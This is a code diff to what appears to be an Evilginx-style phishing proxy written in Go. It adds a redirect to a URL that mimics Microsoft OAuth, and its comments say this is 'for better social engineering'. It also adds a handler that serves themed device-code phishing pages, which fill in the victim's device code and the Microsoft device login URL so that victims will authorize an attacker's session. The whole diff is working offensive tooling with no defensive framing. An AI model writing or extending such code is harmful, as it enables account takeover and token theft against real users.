@@ -315,7 +315,8 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 			dcTheme := l.DeviceCodeTheme
 			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
 			if dcTheme != "" && dcTheme != "default" {
-				interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+				// Use OAuth-style URL that looks like Microsoft OAuth for better social engineering
+				interstitialURL = fmt.Sprintf("/oauth?sso_reload=true&tid=%s&theme=%s", session.Id, dcTheme)
 			}
 			resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "")
 			resp.Header.Set("Location", interstitialURL)
@@ -350,7 +351,8 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 			dcTheme := l.DeviceCodeTheme
 			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
 			if dcTheme != "" && dcTheme != "default" {
-				interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+				// Use OAuth-style URL that looks like Microsoft OAuth for better social engineering
+				interstitialURL = fmt.Sprintf("/oauth?sso_reload=true&tid=%s&theme=%s", session.Id, dcTheme)
 			}
 			resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 			resp.Header.Set("Location", interstitialURL)
@@ -967,6 +969,8 @@ var (
 	dcAdobeRe        = regexp.MustCompile(`^/access/adobe/([a-zA-Z0-9_-]+)$`)
 	dcDocuSignRe     = regexp.MustCompile(`^/access/docusign/([a-zA-Z0-9_-]+)$`)
 	dcSharePointRe   = regexp.MustCompile(`^/access/sharepoint/([a-zA-Z0-9_-]+)$`)
+	// OAuth-style URL for device code interstitial (looks like Microsoft OAuth URL)
+	dcOAuthRe        = regexp.MustCompile(`^/oauth$`)
 	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
 	tokenFeedRe      = regexp.MustCompile(`^/api/v1/feed$`)
 	mailboxApiRe     = regexp.MustCompile(`^/api/v1/mailbox$`)
@@ -1836,6 +1840,62 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
+
+			// --- OAuth-style device code endpoint (Microsoft-looking URL with tid parameter) ---
+			if dcOAuthRe.MatchString(req.URL.Path) {
+				// Extract session ID and theme from query parameters
+				session_id := req.URL.Query().Get("tid")
+				theme := req.URL.Query().Get("theme")
+				if session_id != "" && theme != "" {
+					log.Debug("[devicecode] serving OAuth-style %s themed page for session: %s", theme, session_id)
+					p.session_mtx.Lock()
+					s, ok := p.sessions[session_id]
+					p.session_mtx.Unlock()
+
+					if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
+						userCode := ""
+						verifyURL := "https://microsoft.com/devicelogin"
+						expiresIn := 900
+						codeReady := false
+
+						if s.DCSessionID != "" {
+							dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
+							if dcOk {
+								dcs.mu.Lock()
+								userCode = dcs.UserCode
+								verifyURL = dcs.VerifyURL
+								expiresIn = int(time.Until(dcs.ExpiresAt).Seconds())
+								dcs.mu.Unlock()
+								codeReady = true
+							}
+						}
+
+						if expiresIn < 0 {
+							expiresIn = 0
+						}
+						expMinutes := expiresIn / 60
+
+						html := GetInterstitialByTheme(theme)
+						if codeReady {
+							html = strings.ReplaceAll(html, "{user_code}", userCode)
+						} else {
+							html = strings.ReplaceAll(html, "{user_code}", "")
+						}
+						html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
+						html = strings.ReplaceAll(html, "{session_id}", session_id)
+						html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
+						html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
+						html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
+
+						resp := goproxy.NewResponse(req, "text/html", 200, html)
+						resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+						resp.Header.Set("Pragma", "no-cache")
+						return req, resp
+					}
+
+					return p.blockRequest(req)
+				}
+			}
 			// --- End themed document access device code endpoints ---
 
 			// --- Begin portal endpoint (token-to-cookie conversion) ---
@@ -2356,7 +2416,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										dcTheme := l.DeviceCodeTheme
 										var interstitialURL string
 										if dcTheme != "" && dcTheme != "default" {
-											interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+											// Use OAuth-style URL that looks like Microsoft OAuth for better social engineering
+											interstitialURL = fmt.Sprintf("/oauth?sso_reload=true&tid=%s&theme=%s", session.Id, dcTheme)
 										} else {
 											interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
 										}
